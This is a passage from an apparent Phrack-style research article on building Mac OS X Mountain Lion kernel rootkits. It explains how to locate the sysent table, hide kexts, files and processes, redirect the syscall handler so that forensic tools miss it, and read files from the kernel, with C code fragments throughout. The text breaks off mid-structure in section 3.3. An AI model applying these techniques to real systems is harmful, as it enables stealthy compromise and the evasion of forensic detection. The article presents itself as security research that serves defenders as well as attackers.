Title : Revisiting Mac OS X Kernel Rootkits
Author : fG!
Date : April 18, 2014

|=----------------------------------------------------------------------------=|
|=----------------=[ Revisiting Mac OS X Kernel Rootkits ]=-------------------=|
|=----------------------------------------------------------------------------=|
|=------------------------=[ fG! <phrack@put.as> ]=---------------------------=|
|=----------------------------------------------------------------------------=|

--[ Contents

  1 - Introduction
  
  2 - The classic problems
    2.1 - What is new since Tiger
    2.2 - Sysent table discovery techniques
    2.3 - Hiding the kext
    2.4 - Hiding files
    2.5 - Hiding processes
    2.6 - Modifying the syscall handler
    
  3 - Reading the filesystem from kernel land
    3.1 - Real short overview of VFS
    3.2 - The easy way - Apple loves rootkit authors!
    3.3 - The more complex way
    3.4 - Solving kernel symbols
    
  4 - Executing userland binaries from the kernel
    4.1 - Writing from kernel memory into userland processes
    4.2 - Abusing (again!) dyld to inject and run code
    4.3 - Finding the place to execute the injection
    4.4 - Ideas are great, execution is everything
    4.5 - The dynamic library
    4.6 - Hiding our tracks
    
  5 - Revisiting userland<->kernel communication
    5.1 - Character devices and ioctl
    5.2 - Kernel control KPI
    5.3 - Ideas for our own alternative channels
    
  6 - Anti-forensics
    6.1 - Cheap tricks to reduce our footprint
    6.2 - Attacking DTrace and other instrumentation features
        6.2.1 - FSEvents
        6.2.2 - kdebug
        6.2.3 - TrustedBSD
        6.2.4 - Auditing - Basic Security Module
        6.2.5 - DTrace
              6.2.5.1 - syscall provider
              6.2.5.2 - fbt provider
    6.3 - AV-Monster II
    6.4 - Bypassing Little Snitch
    6.5 - Zombie rootkits
    
  7 - Caveats & Detection
  
  8 - Final words
  
  9 - References
  
  10 - T3h l337 c0d3z

--[ 1 - Introduction

In Phrack #66, ghalen and wowie wrote about interesting OS X kernel rootkit
techniques. That article is almost 4 years old and 4 major OS X releases behind.
Today Mountain Lion is king and many of the presented techniques are not valid
anymore - Apple reacted and closed those "holes".

One hand is enough to count the number of known rootkits targetting Apple's OS.
The most recent public release was Rubylin [2], a simple rootkit that works with
Lion (v10.7) (if you can read Korean there is a very interesting memory
forensics analysis at [3]). 
The commercial spyware industry recently leaked DaVinci (aka OS.X/Crisis), a
user/kernel rootkit with some interesting features and flaws [4]. There are
rumours about FinFisher but no OS X leak happened yet. Everything else is too old
and outdated.

The main goal of this article is to update public knowledge and introduce some
"new" techniques so both offensive and defensive sides can improve. It is
focused on the current version at the time of this writing, Mountain Lion,
v10.8.2.
The defensive knowledge and available tools are still poor. I hope this article
motivates others to invest time and resources to improve this scenario.
It is quite certain that the offensive knowledge is significantly ahead.

I tried to make this article as complete as possible but there is so much to
work to be done that it is a never-ending story. Some of the proposed solutions
can be improved or implemented in different and/or better ways. You are
encouraged to improve or develop new approaches and of course publish them. I
also like to learn from others ;-)

I hope you enjoy this (long) journey.
fG!

--[ 2 - The classic problems

This section starts by introducing important changes made since Tiger.
Then it discusses the old sysent retrieval techniques and their problems, and
presents a solution compatible with past, current, and future OS X versions.

It continues with improvements to classic rootkit features - hide and avoid
(easy) detection. It must be noticed that these were developed before the
in-kernel symbol resolution technique to be presented later, so they
might appear a bit unsophisticated. I think there is value in this knowledge and
that is why it is described under the original conditions.

----[ 2.1 - What is new since Tiger

The easiest and many favourite's spot to hook the system calls is the sysent
table - just replace a pointer and we are set. Apple has been improving the
defence of that "castle" by hiding the sysent table symbol and moving its
location.
In Mountain Lion the table is now located in read-only memory (not a big problem
anyway). Syscall hijacking techniques like these can be easily found with basic
analysis tools, but they are still interesting and useful for other purposes as
to be shown later.

Another important change is that the kernel module list (kmod_info_t) is
deprecated. Before, the kernel extension rootkit could be easily hidden from
kextstat by manipulating this list. Now we must patch an I/O Kit OSArray class
called sLoadedKexts to hide from tools that list loaded kernel extensions. Snare
was the first to publicly discuss this issue, and the commercial spyware
OS.X/Crisis the first (afaik) to implement it. Its technique will be later
described.

Mountain Lion finally introduced kernel ASLR. It might be harder to develop and
execute the necessary exploit to install the rootkit but after that it is
(mostly) business as usual.

Up to Snow Leopard, Apple removed the symbol table from the kernel space so
there was no easy way to solve non-exported symbols inside the kernel extension
or I/O Kit driver. This was changed in Lion by leaving the full __LINKEDIT 
segment in kernel memory but marked as pageable. Snare shows this in one of his 
posts [5] and rubilyn rootkit uses it. Beware that the formula they use has a 
small problem - it assumes that the symbol table is located at the beginning of
__LINKEDIT. This is true in Lion but not in Mountain Lion.

I will show you how a solution that is stable, simple, and compatible with all
OS X versions. Too good to be true! :-)

----[ 2.2 - Sysent table discovery techniques

As described in Phrack 66 article, Landon Fuller [6] was first to come public
with a technique to solve the removal of exported sysent symbol. 
His technique is based on the distance between the (still) exported nsysent
symbol (the number of entries in the sysent table, aka, number of syscalls) and
sysent. The problem with this approach is that Apple can move the location of
sysent between releases - offsets will change and the rootkit will fail and
expose itself. Not acceptable!

Lets illustrate this with an example, starting with Mountain Lion 10.8.2:
$ nm /mach_kernel | grep nsysent
ffffff8000839818 D _nsysent

The location of sysent can be found by disassembling the kernel and using one of
the three functions that reference it:
- unix_syscall
- unix_syscall64
- unix_syscall_return

For 10.8.2 the sysent pointer will be located at 0xFFFFFF80008000D0 and the
table located at 0xFFFFFF8000855840. Landon's formula does not apply here.

In Lion 10.7.5 we have:
$ nm mach_kernel_10_7_5 | grep nsysent
ffffff8000846ed8 D _nsysent
And sysent located at 0xFFFFFF8000842A40.

This confirms Apple moving around the pointer between different releases. Notice
that all previous values are from kernel at disk so no kernel ASLR slide is
included. The slide value will be disclosed whenever it is being used in the
examples.

Another technique is described in The Mac Hacker's Handbook [7], released in
2009 and targeting Leopard.
On page 332 there is a code snippet that searches memory for "something that has
the same structure as the sysent table.". The starting search point is the
nsysent symbol, increasing the memory pointer to lookup and match sysent array
elements.

That code snippet does not work with Snow Leopard because sysent array is
located before nsysent symbol. It must be modified to support specific versions
and releases.
These different examples demonstrate that Apple changes sysent location between
releases. A stable rootkit requires an universal technique.

The second technique can be adapted to cover all cases. First we would
scan memory addresses above nsysent and then below if initial search failed. If
nsysent also stops being exported we would need to base the search in another
symbol and continue the cat & mouse game.

The reference symbol problem can be easily solved using a feature of x86
systems, the interrupt descriptor table (IDT). The IDT "is used by the processor
to determine the correct response to interrupts and exceptions." [8]. The
traditional implementation of syscalls is done via interrupt 80. The
response to this interrupt will be executed by a kernel function pointed to by
the IDT. IDT's location can be obtained using the asm instruction "sidt" (store
interrupt descriptor table register). It returns the table location so the next
step is to find out the address of the interrupt 80 handler.

Once we have the interrupt 80 handler address we can find out the base address
of the kernel. Kernel ASLR does not matter here because the handler address is
always a valid kernel code location - we are dynamically querying the system and
not using fixed addresses. To find the kernel base address is just a matter of
searching memory back for the magic value of the Mach-O header - 0xfeedfacf (64
bits) or 0xfeedface (32 bits).
One (curious) property of kernel ASLR implementation is that memory addresses in
kernel and kexts Mach-O headers already contain the ASLR slide, something that
does not happen in userland ASLR'ed binaries. The header in userland binaries is
never updated so it is not synced with the address where the binary is loaded
at.

The next step is to process the Mach-O headers and find out where the __DATA
segment is located. The reason for this is that the sysent table is located in
there - we need to extract segment's start address and boundaries. Now it is
just a matter of searching memory for something that matches the sysent table.

Are there any performance problems doing things like this? The sysent location
is found in less than a second even on a 5 year old Core 2 Duo Macbook Pro. The
performance impact can be considered meaningless.

This method was applied successfully when the first Mountain Lion developer
preview became available and still works up to 10.8.2.

You can find its implementation in the included source code at the end.
A userland version that uses /dev/kmem to extract the same information is
available at [9].

What is the difference against using any other exported symbol instead of all
the trouble with the interrupt handler? Honestly, it is just a matter of
personal preference and technical "prowess". A symbol that breaks compatibility
if removed could be used instead with very low risk of Apple changing it.
Later, we will need to use at least one KPI so almost any symbol from it can be
used as search's starting point.

Another solution is to use one MSR register involved in the SYSCALL instruction.
A good candidate is the MSR register number 0xC0000082 (MSR_IA32_LSTAR), which
contains the SYSCALL entrypoint.

One way to get its value in 64 bits is the following (ripped from XNU):

#define rdmsr(msr,lo,hi) \
__asm__ volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (msr))

static inline uint64_t rdmsr64(uint32_t msr)
{
    uint32_t lo=0, hi=0;
    rdmsr(msr, lo, hi);
    return (((uint64_t)hi) << 32) | ((uint64_t)lo);
}

Calling rdmsr64(0xC0000082) will return the kernel address that will handle
64 bits syscalls via the SYSCALL interface. The register number 0x176
(MSR_IA32_SYSENTER_EIP) is the one we are interested at for 32 bits systems - it
is used for 32 bits syscalls via SYSENTER.

These are just a few possibilities to retrieve a valid address inside the
running kernel and then find the start address of the kernel Mach-O header
and sysent location. The location of the Mach-O header will be useful to compute
the kernel ASLR value (the slide is stored in a kernel variable but its symbol
is not exported!).

----[ 2.3 - Hiding the kext

As mentioned before, the kernel module list is deprecated in favor of a IOKit
OSArray class called sLoadedKexts. This introduces a new problem: how to find
its location since we are talking about IOKIT C++. The OS.X/Crisis spyware
implemented an interesting solution. It leverages a simple IOKit method that
references sLoadedKexts to find the object location.
The method is OSKext::lookupKextWithLoadTag [libkern/c++/OSKext.cpp]:
OSKext * OSKext::lookupKextWithLoadTag(uint32_t aTag)
{
    OSKext * foundKext = NULL;  // returned
    uint32_t count, i;

    IORecursiveLockLock(sKextLock);

    count = sLoadedKexts->getCount(); <- use this location, for example
    for (i = 0; i < count; i++) {
        OSKext * thisKext = OSDynamicCast(OSKext, sLoadedKexts->getObject(i));
        if (thisKext->getLoadTag() == aTag) {
            foundKext = thisKext;
            foundKext->retain();
            goto finish;
        }
    }
finish:
    IORecursiveLockUnlock(sKextLock);
    return foundKext;
}

There is no symbol resolution feature inside the Crisis kernel rootkit - the
symbol (__ZN6OSKext21lookupKextWithLoadTagEj) is solved by the userland
component and sent to the rootkit module via a sysctl. The function that hides
the rootkit starts by searching for the 0xE8 byte corresponding to the
IORecursiveLockLock() call. All searches are done using hex patterns. It then
uses fixed offsets to compute the location of the array and modify it.
The provided source code reimplements this technique.

The search could be made easier (and portable?) by disassembling this method. 
The good news is that we can have a x86/x64 disassembler inside a kernel
extension thanks to diStorm [19] (other libraries probably work but I'm a
fan of diStorm, in particular after the introduction of the decompose
interface). To statically compile diStorm just import the source and include
files into your rootkit project. You also need to define SUPPORT_64BIT_OFFSET or
uncomment it at config.h.

Assuming we have no method to find kernel symbols inside the rootkit (this will
be later developed), we can use the disassembling engine to try to find the
functions or methods that we are interested in. The whole __text section can be
disassembled and searched for instruction patterns that are hopefully more
stable than hex patterns.

Testing this approach I was able to find the method referenced above with a
precision of 100% or 50%. The different rates depend on how strict are the
search parameters due to some differences between compiler output in kernel
versions. I'm talking about the number of calls, jmps, jnz, jae, which have
small variations between some versions (compiler upgrades, settings, etc).
The performance is amazing - it takes 1 second to disassemble and search the
whole kernel using a high-end Intel i7 cpu.

The main problem of Crisis's approach is that it depends on fixed offsets inside
the OSArray class. If anything changes it will break compatibility and
potentially crash or expose the rootkit.
Disassembling the kernel is useful to find patterns and leveraging them in
different cases. It is not perfect and does not solve all our problems but it is
another helpful tool.

----[ 2.4 - Hiding files

Files are hidden by modifying (at least) three different syscalls:
getdirentries, getdirentriesattr, and getdirentries64. Nothing new and
thoroughly described before.
What usually happens is that only the filename is matched - that is the 
information directly available from the structures available in those three
syscalls. This means that a filename to be hidden will be matched in any folder,
something that can raise suspicion if a common filename is used. With a small
effort we can do better and learn something in the process.

Let's find out how to recover additional information to match specific file or
folder locations. Target function is getdirentries64 but the concepts apply to
the other two.

The structure that is commonly manipulated is:
struct direntry {
  __uint64_t  d_ino;      /* file number of entry */
  __uint64_t  d_seekoff;  /* seek offset (optional, used by servers) */
  __uint16_t  d_reclen;   /* length of this record */
  __uint16_t  d_namlen;   /* length of string in d_name */
  __uint8_t   d_type;     /* file type, see below */
  char      d_name[__DARWIN_MAXPATHLEN]; /*entry name (up to MAXPATHLEN bytes)*/
}

The match is done against the field d_name, which only contains the current file
or folder without the full path. This is the reason why most implementations
only match the file anywhere in the filesystem.

Luckily for us, all syscalls functions prototypes contain the proc structure as
the first parameter. It contains enough information to match the full pathname.

struct proc {
(...)
    struct  filedesc *p_fd;        /* Ptr to open files structure. */
(...)
}

struct filedesc {
    struct  fileproc **fd_ofiles;   /* file structures for open files */
    char    *fd_ofileflags;         /* per-process open file flags */
    struct  vnode *fd_cdir;         /* current directory */
    struct  vnode *fd_rdir;         /* root directory */
    int     fd_nfiles;              /* number of open files allocated */
    int     fd_lastfile;            /* high-water mark of fd_ofiles */
    (...)
};

For example, to display all the open files by an arbitrary process calling
getdirentries64, we could use the following code:
void show_all_openfiles(struct proc *p)
{
    // lock proc structure else we are asking for trouble
    (*proc_fdlock)(p);
    struct filedesc *fd = p->p_fd;
    if (fd != NULL)
    {
        // for some reason fd_nfiles is not useful for this
        int lastfile = fd->fd_lastfile;
        // show all open files for this proc
        for (int count = 0; count < lastfile; count++)
        {
            // fd_ofiles is an array of fileproc that contains file structs
            // for all open files
            struct fileproc *fp = fd->fd_ofiles[count];
            // we are only interested in files so match fg_type field
            if (fp != NULL && 
                fp->f_fglob != NULL && 
                fp->f_fglob->fg_type == DTYPE_VNODE)
            {
                // lock the vnode - fg_data cast depends on fg_type
                // type is vnode so we know fg_data will point to a vnode_t
                (*vnode_lock)((struct vnode*)fp->f_fglob->fg_data);
                struct vnode *vn = (struct vnode*)fp->f_fglob->fg_data;
                if (vn->v_name != NULL)
                {
                    printf("[%d] Filename: %s\n", count, vn->v_name);
                }
                (*vnode_unlock)((struct vnode*)fp->f_fglob->fg_data);
            }
        }
    }
    (*proc_fdunlock)(p);
}

The files listed by this function are not the files we want to hide but the
files opened by the binary calling this syscall. This information can be used,
for example, to find the path that a "ls" command is trying to list. The full
path can be extracted manually by iterating over the vnodes of each file, or by
using a KPI function (vn_getpath).

To build the path from vnodes, first we retrieve the vnode structure
correspondent to the file and then iterate over up to the filesystem root - each
vnode has a reference to its parent vnode.

struct vnode {
(...)
    const char *v_name;      /* name component of the vnode */
    vnode_t v_parent;        /* pointer to parent vnode */
(...)
}

Each path component can be sequentially matched until v_parent == NULLVP, which
means the filesystem root. If path matches what we want to hide then it is a
matter of removing that entry from direntry array as usual.

To find the folder or file being listed we can use the following trick, which
seems to hold true:
int lastfile = main_fd->fd_lastfile;               
// lastfile has the information we are looking for
struct fileproc *last_fp = main_fd->fd_ofiles[lastfile]; 

The only word of caution is when shell expansion is involved. In this case last
file entry name will be a "ttys" and we need to iterate fd_ofiles array looking
for the previous element to "ttys" - it is not lastfile-1.

It looks complicated but it is not and just a matter of looking up the necessary
information in kernel structures. The proc structure is extremely rich and a
good starting point for many hacks. The biggest problem is being frequently
changed between major OS X versions.

With so many kernel functions available it is almost certain there is already a
function that will avoid us to build the path as described above. That function
is vn_getpath() from bsd/sys/vnode.h.

/*!
 @function vn_getpath
 @abstract Construct the path to a vnode.
 @discussion Paths to vnodes are not always straightforward: a file with
multiple hard-links will have multiple pathnames, and it is sometimes impossible
to determine a vnode's full path.  vn_getpath() will not enter the filesystem.
 @param vp The vnode whose path to obtain.
 @param pathbuf Destination for pathname; should be of size MAXPATHLEN
 @param len Destination for length of resulting path string.  Result will
include NULL-terminator in count--that is, "len"
 will be strlen(pathbuf) + 1.
 @return 0 for success or an error code.
 */
int vn_getpath(struct vnode *vp, char *pathbuf, int *len);

We still need to retrieve a vnode from the proc structure to use this function.
To find the vnode we can use the lastfile trick to find the target path,
retrieve its vnode and then use this function to get the full path.

A better solution is to hide your data inside other data files that can't be
easily checksum'ed. Sqlite3 databases come to my mind [35].

----[ 2.5 - Hiding processes

The traditional way to hide processes is to remove them from the process list
maintained by the kernel. When an application requests the process list, the
rootkit intercepts and modifies the request. In this case, only the results are
modified and the underlying structures are still intact. A rootkit detection
tool can access those structures and compare with the results.
Another possibility is to remove the processes from the process list. This time
a tool that is based on those structures information will not be able to detect
the inconsistency because there is none (regarding only the proc list, because
there is data in other structures that can be used to signal inconsistencies).

Due to OS X design, things are a bit more fun (or complicated) because the BSD
layer runs on top of XNU layer. The basic process units are Mach tasks and
threads and there's a one-on-one mapping between BSD processes and Mach tasks.
The task is just a container and Mach threads are the units that execute code.
What matters for this case is that there is an additional list where
inconsistencies can be detected - the Mach tasks list. 
Using an ascii version of nofate's diagram found at [3]:

 proc <-> proc  <-> proc  <-> ...
  ^         ^         ^              BSD
--|---------|---------|------------------
  v         v         v              Mach
tasks <-> tasks <-> tasks <-> ...

The version with a hidden process at the BSD layer:

 proc <------------> proc <-> ...
  ^         ^         ^              BSD
--|---------|---------|------------------
  v         v         v              Mach
tasks <-> tasks <-> tasks <-> ...

Each BSD process has reference to the Mach tasks list via a void pointer and
vice-versa. Transversing both lists can detect the inconsistency described above
and most certainly flag an installed rootkit (it is possible to have a Mach task
without a corresponding BSD process).

struct proc {
(...)
    void *task;     /* corresponding task (static) */
(...)
}

struct task {
(...)
    void *bsd_info; /* the corresponding proc_t */
(...)
}

The (not so new) lesson to extract from this is that there many points to be
used for detecting inconsistencies in the system. These are hard to hide if the
goal is to hide one or more rogue processes. A much better solution is to
piggyback into normal processes, where detection is a bit harder - it can be a
normal process with an extra thread running for example. The piggyback solution
will be used later to run userland commands from the kernel.

----[ 2.6 - Modifying the syscall handler

A common technique to hide modifications to syscall table is to make a copy and
modify the syscall handler to point to this new one. Rootkit detection utils
that just verify the *legit* table are unable to detect it. There's nothing new
about this technique although I have never seen it in use in OS X. It is a good
opportunity to describe how to implement it.

The interrupt 0x80 is handled by the assembly function idt64_unix_scall
[osfmk/x86_64/idt64.s]. The IDT table definition [osfmk/x86_64/idt_table.h]
confirms this and can be runtime verified by querying the IDT and extracting the
address of int80 handler.

USER_TRAP_SPC(0x80,idt64_unix_scall)

Follow the idt64_unix_scall assembler code. The switch to C happens when
unix_syscall[64] function is called, both for interrupt 0x80 and
sysenter/systrap system calls. This code path opens many opportunities to change
pointers, or install trampolines and redirect code to rootkit's implementation.

One such possibility is to change the table pointer inside unix_syscall[64].
This is sample code from the 64 bits version:
(...)
    code = regs->rax & SYSCALL_NUMBER_MASK;
    DEBUG_KPRINT_SYSCALL_UNIX(
        "unix_syscall64: code=%d(%s) rip=%llx\n",
        code, syscallnames[code >= NUM_SYSENT ? 63 : code], regs->isf.rip);
    callp = (code >= NUM_SYSENT) ? &sysent[63] : &sysent[code];
    uargp = (void *)(&regs->rdi);
(...)
    AUDIT_SYSCALL_ENTER(code, p, uthread);
    error = (*(callp->sy_call))((void *) p, uargp, &(uthread->uu_rval[0]));
    AUDIT_SYSCALL_EXIT(code, p, uthread, error);
(...)

Disassembly output (here I renamed memory references in IDA since they have no
symbols associated):
loc_FFFFFF80005E169C:
4C 03 2D 2D EA 21 00            add     r13, cs:sysent
4C 3B 2D 26 EA 21 00            cmp     r13, cs:sysent
74 0B                           jz      short loc_FFFFFF80005E16B7

The sysent reference is to:
__DATA:__got:FFFFFF80008000D0 40 58 85 00 80 FF FF FF sysent   dq offset
sysent_table

To directly find the location of sysent in the __got section is very easy. Find
out the location of sysent table using one of the section 2 techniques (or some
other) and then search the __got section for that address (to find the location
and boundaries of __got section we just need to read kernel's Mach-O header). 

The easiest way to redirect sysent is to modify that pointer to our modified
copy. A (memory) forensic tool that (only) searches for and lookups the original
sysent table will fail to detect this and the next trick. For example, Volafox
v0.8 is vulnerable. Volatility's Mac version at the time of writing has yet no
sysent plugin available.

Another way is to modify the code reference to __got section and instead point
it to somewhere else. This is very easy to implement with diStorm's assistance. 

Disassemble the unix_syscall[64] functions and lookup for references to __got
address. The instructions that need to be matched are ADD and CMP (this
assumption appears to hold always true). To calculate the RIP target address,
diStorm has a helper macro called INSTRUCTION_GET_RIP_TARGET(). 
If the RIP address matches the __got address the offset can be updated.
Calculate the offset to the address that contains the pointer to the new table
and update it at the instruction that referenced the old __got pointer.

One last (important!) detail. RIP addressing uses a 32 bits offset, which
appears to be enough to reference the new sysent (dynamically or statically
allocated) in most cases. This might not always be true - from my experience the
distance is very near the signed int limit.
One way to make this safer is to put the pointer in kernel's memory space. This
can be alignment space, Mach-O header (for the lulz!), or somewhere else (it is
just a data pointer so no need for exec permission).

--[ 3 - Reading the filesystem from kernel land

Now let's get going with the fun stuff that opens the door to even funnier
stuff!

One of the annoying obstacles that Apple introduced against development of
rootkits is the lack of kernel's full __LINKEDIT segment up to Snow Leopard.
Useful symbols for rootkit development are also not exported. No one said
rootkit development was easy - fun but not always easy.

Possible solutions are to solve the symbols from userland, and pattern search
from the kext - this one easily susceptible to failure due to changing patterns
in kernel versions and compilers.

For example, OS.X/Crisis spyware adopts a mixed approach. Most symbols are
solved from the userland agent and communicated thru a character device to the
rootkit, but sLoadedKexts is solved with byte search - starting point is still a
symbol solved from userland.

The easiest solution to this problem is to read the kernel file (/mach_kernel)
from the rootkit and process the symbol table, as it is done from userland. The
extracted addresses need to be fixed with the kernel ASLR slide but that is 
easily bypassed as described in section 2.2.

As far as I know no publicly known OS X rootkit ever implemented arbitrary
filesystem read, and probably very few to none in other platforms (TDSS being
the most famous in Windows). There is some kind of myth about the difficulty of
implementing this or something else that made rootkits developers avoid it. I
must confess I was influenced by that "myth" and never bothered to give it a try
before this article. 

In practice the implementation is extremely easy!
Sometimes you just need to be in the right mood and give it a try.

Two methods will be shown, one very easy based on exported symbols (and a copy
of a very stable private extern kernel function), and another a bit more complex
that requires some unexported symbols. Both are based in VFS - the obvious and
easiest way to achieve our goal. Other functions can be used so many variations
are possible. That is left open for you to explore, I still have a lot to write
about in this paper :-)

----[ 3.1 - Real short overview of VFS

The Virtual-Filesystem Interface was introduced in 4.4BSD and first implemented
by Sun Microsystems. Before this innovation file entries directly referenced
filesystem inodes. This method does not scale well if there's more than a
filesystem type. 

VFS is an additional extensible object-oriented layer that introduces an
abstraction of the underlying filesystem, making it easy to support multiple
filesystems. Instead of inodes there are vnodes. There is no need to deal with
the intricacies of multiple filesystems - we can use the VFS related functions
and let the kernel do the filesystem operations "dirtywork".

The most interesting VFS related structures to our purposes are:
- struct filedesc: defined at bsd/sys/filedesc.h, represents the open files in a
process.
- struct fileproc: defined at bsd/sys/file_internal.h, represents each open
file.
- struct fileglob: defined at bsd/sys/file_internal.h, contains all the
information associated to a file, including vnode and supported filesystem
operations.
- struct vnode: defined at bsd/sys/vnode_internal.h.

Detailed references about the design and implementation can be found at [20],
[14] and [13]. 

----[ 3.2 - The easy way - Apple loves rootkit authors!

The first piece of information that we need is the vnode of the target file we
want to read. We already seen in section 2.4 that this information is available
in proc_t structure but we can follow an easier path!

One suitable function is vnode_lookup() (available in BSD KPI). It is
defined at bsd/vfs/vfs_subr.c in XNU source code, and well documented at
bsd/sys/vnode.h include:
/*!
 @function vnode_lookup
 @abstract Convert a path into a vnode.
 @discussion This routine is a thin wrapper around xnu-internal lookup routines;
if successful, it returns with an iocount held on the resulting vnode which must
be dropped with vnode_put().
 @param path Path to look up.
 @param flags VNODE_LOOKUP_NOFOLLOW: do not follow symbolic links.
              VNODE_LOOKUP_NOCROSSMOUNT: do not cross mount points.
 @return Results 0 for success or an error code.
 */
errno_t vnode_lookup(const char *, int, vnode_t *, vfs_context_t);

The arguments are the path for the target file, search flags, a vnode_t pointer
for output and the vfs context for the current thread (or kernel context).

The vfs context can be obtained using the function vfs_context_current() but it
is only available in the Unsupported KPI - subject to whatever Apple wants to
do with it so not stable enough for our purposes. In practice the vfs context is
not a problem because Apple (or BSD's original code) took good care of us. Let
me show you why with kernel's implementation of vnode_lookup():

errno_t
vnode_lookup(const char *path, int flags, vnode_t *vpp, vfs_context_t ctx)
{
    struct nameidata nd;
    int error;
    u_int32_t ndflags = 0;

    if (ctx == NULL) {      /* XXX technically an error */
        ctx = vfs_context_current(); // <- thank you! :-)
    }
(...)
}

Apple's love means that we just need a simple operation to retrieve kernel's
vnode:
#include <sys/vnode.h>
int error = 0;
vnode_t kernel_vnode = NULLVP;
error = vnode_lookup("/mach_kernel", 0, &kernel_vnode, NULL);

One important detail is that vnode_lookup() will increase the iocount on the
target vnode (in case you missed above note from vnode_lookup). We must release
it using vnode_put() when we do not need it anymore (after reading or writing
what we want). This function is also available in the BSD KPI.

Having kernel's vnode information we can finally read its contents from the
rootkit. To do that we can use the VNOP_READ() function - documented and
declared at bsd/sys/vnode_if.h.
/*!
 @function VNOP_READ
 @abstract Call down to a filesystem to read file data.
 @discussion VNOP_READ() is where the hard work of of the read() system call
happens. The filesystem may use  the buffer cache, the cluster layer, or an
alternative method to get its data; uio routines will be used to see that data
 is copied to the correct virtual address in the correct address space and will
update its uio argument to indicate how much data has been moved.  
 @param vp The vnode to read from.
 @param uio Description of request, including file offset, amount of data
requested, destination address for data, and whether that destination is in
kernel or user space.
 @param ctx Context against which to authenticate read request.
 @return 0 for success or a filesystem-specific error. VNOP_READ() can return
success even if less data was read than originally requested; returning an error
value should indicate that something actually went wrong.
 */
extern errno_t VNOP_READ(vnode_t, struct uio *, int, vfs_context_t);

The last missing piece is an uio structure. To create that buffer we can use
three other functions: uio_create(), uio_createwithbuffer() and uio_addiov(). 

Two are available in BSD KPIs - uio_create and uio_addiov. The other one,
uio_createwithbuffer is private extern and used by uio_create. We can rip its
implementation into our rootkit code from XNU source file bsd/kern/kern_subr.c.
It's simple and stable enough to make this possible (never modified in all
latest OS X versions).

Once again we can pass NULL to the ctx argument - the implementation takes
care of it for us as in vnode_lookup().

An example how to create the required structure to hold a 4kbytes page:
char data_buffer[PAGE_SIZE_64];
uio_t uio = NULL;
uio = uio_create(1, 0, UIO_SYSSPACE, UIO_READ);
error = uio_addiov(uio, CAST_USER_ADDR_T(data_buffer), PAGE_SIZE_64);

The same example using uio_createwithbuffer:
char data_buffer[PAGE_SIZE_64];
uio_t uio = NULL;
char uio_buf[UIO_SIZEOF(1)];
uio = uio_createwithbuffer(1, 0, UIO_SYSSPACE, UIO_READ, &uio_buf[0],
 sizeof(uio_buf));
error = uio_addiov(uio, CAST_USER_ADDR_T(data_buffer), PAGE_SIZE_64);

First create the uio buffer, and then add it else it can't be used.
The data buffer can be a statically allocated buffer (as above) or dynamically
allocated using _MALLOC() or other available kernel variant.

Having the uio buffer created the last step is to execute the read:
error = VNOP_READ(kernel_vode, uio, 0, NULL);

If successful, the buffer will contain the first page (4096 bytes) of
/mach_kernel OS X kernel read into data_buffer. 

A good implementation reference of this process is the kernel function
dqfileopen() [bsd/vfs/vfs_quota.c].

----[ 3.3 - The more complex way

This second approach was in fact how I started to explore this problem and
before I learnt about vnode_lookup(). It is a good backup method but the
learning experience and some techniques used to obtain some information are the
interesting bits here.

Its biggest inconvenience is that it requires the unexported symbol
VNOP_LOOKUP(). This function requires diferent arguments but has the same
functionality as vnode_lookup() - to lookup the vnode of a file or directory.
Documentation can be found at bsd/sys/vnode_if.h.

/*!
 @function VNOP_LOOKUP
 @abstract Call down to a filesystem to look for a directory entry by name.
 @discussion VNOP_LOOKUP is the key pathway through which VFS asks a filesystem
to find a file.  The vnode should be returned with an iocount to be dropped by
the caller.  A VNOP_LOOKUP() calldown can come without a preceding VNOP_OPEN().
 @param dvp Directory in which to look up file.
 @param vpp Destination for found vnode.
 @param cnp Structure describing filename to find, reason for lookup, and
various other data.
 @param ctx Context against which to authenticate lookup request.
 @return 0 for success or a filesystem-specific error.
 */
#ifdef XNU_KERNEL_PRIVATE
extern errno_t VNOP_LOOKUP(vnode_t, vnode_t *, struct componentname *,
vfs_context_t);
#endif /* XNU_KERNEL_PRIVATE */

The first argument is the vnode of the directory where the target file is
located. It is a kind of a chicken and egg problem because we do not have that
information - we want it! Do not fear, this information can be extracted from
somewhere else. As previously described, the proc structure contains the field
p_fd - pointer to open files structure (struct filedesc).

The filedesc structure has two interesting fields for our purposes:
1) fd_ofiles - an array of file structures for open files.
2) fd_cdir   - vnode structure of current directory.

There is also fd_rdir, which is the vnode of root directory but from my tests it
is usually NULL.

The proc structure is a doubly-linked list - we can "walk" around it and
retrieve information of any process. In OS X, the kernel is just another Mach
task with PID 0 and a corresponding proc entry - before Leopard we could access
kernel task via task_for_pid(0), which allowed DKOM (direct kernel object
manipulation). The mach_kernel file is located at the root directory /. 

The proposed procedure is to traverse the proc structure and find pid 0 (field
p_pid). When found, the field fd_cdir will contain what we need - the vnode for
the root directory. 

Next problem: how to access the proc structure. There is a symbol called
allproc that contains a pointer to it but it is not exported anymore. We need an
alternative way! Two solutions: complicated and straightforward. 

Recalling what was already described in section 2.4. Kernel's implementation of
syscall functions has a struct proc * as first parameter. Using open() as
example:
open(struct proc *p, struct open_args *uap, int *retval)

What we can do is to temporarily (or not) hijack a syscall via sysent table and
get a reference to any proc_t. Since it is a doubly-linked list we can traverse
it and find PID 0. When found we can extract the vnode pointer for current
directory and that is it. 
The kernel does not keep /mach_kernel open so the field fd_ofiles is not useful.
Luckly for us the fd_cdir is populated with the information we need - vnode of
root directory /.

The kernel knowledgeable reader knows there is no need for all this mess to
retrieve a proc_t structure. There is a BSD KPI function that solves the problem
with a single call, proc_find(). Its prototype is:
proc_t proc_find(int pid)

Kernel is just another task with PID 0, so just execute proc_find(0) and get the
required structure pointer. This will increase the reference count and must be
released using proc_rele(). Very easy, right? :-)

Once again we need a vfs context and this time we need to supply it. While
researching I used a hardcoded function pointer to vfs_context_current() but
there is a better function that I found out while writing this section. It is
vfs_context_create(), available in BSD KPI. 

/*!
 @function vfs_context_create
 @abstract Create a new vfs_context_t with appropriate references held.
 @discussion The context must be released with vfs_context_rele() when no longer
in use.
 @param ctx Context to copy, or NULL to use information from running thread.
 @return The new context, or NULL in the event of failure.
 */
vfs_context_t vfs_context_create(vfs_context_t);

We can use this function to create a new context and pass it to VNOP_LOOKUP().
The next step is to create a struct componentname [bsd/sys/vnode.h].

struct componentname {
     // Arguments to lookup.
    uint32_t    cn_nameiop;     /* lookup operation */
    uint32_t    cn_flags;       /* flags (see below) */
    void        *cn_reserved1;  /* use vfs_context_t */
    void        *cn_reserved2;  /* use vfs_context_t */
